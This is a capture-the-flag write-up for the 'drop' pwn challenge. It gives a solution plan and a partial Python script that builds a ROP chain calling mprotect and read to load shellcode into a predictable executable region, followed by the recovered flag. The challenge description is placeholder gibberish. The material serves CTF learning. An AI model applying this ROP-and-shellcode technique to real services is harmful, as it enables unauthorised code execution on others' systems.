# pwn / still_baby / drop

## Challenge Overview
Name: drop
Author: @hfs
Category: pwn / still_baby
Description: sdkjfhskd skdfhsjd skdjfhs kdfjh sdkjf
Flag format: midnight{...}
Objective: Exploit the remote binary to gain code execution and read the flag.

## Files Provided
- drop.tar.gz
- drop/drop-2fc6353a2f91a08646153b842cc92989

## Solution Plan
1. Analyze the binary and identify that the service maps executable memory at a predictable base region.
2. Recreate the random gadget selection from the current time seed and build a ROP chain.
3. Use the ROP chain to call `mprotect`, read shellcode into the mapped region, jump to it, and read the flag.

## Code (Exploit Script)
```bash
python3 solve_drop.py
```

```python
HOST = "drop.play.ctf.se"
PORT = 8008
BASE = 0xC0D3000
SIZE = 0x800000

def build_payload(g):
    chain = [
        g["pop_rax"], 10,
        g["pop_rdi"], BASE,
        g["pop_rsi"], SIZE,
        g["pop_rdx"], 7,
        g["syscall"],
        g["pop_rax"], 0,
        g["pop_rdi"], 0,
        g["pop_rsi"], BASE,
        g["pop_rdx"], 0x1000,
        g["syscall"],
        BASE,
    ]
    return b"".join(p64(x) for x in chain).ljust(0x200, b"\0")
```

## Flag
```txt
midnight{r4nd0m_1s_4s_r4nD0m_d03s}
```

## Notes
The final exploit brute-forced the live time window, generated the matching gadgets with `drop_gadgets`, sent the ROP chain, then sent shellcode and a command to print the flag.
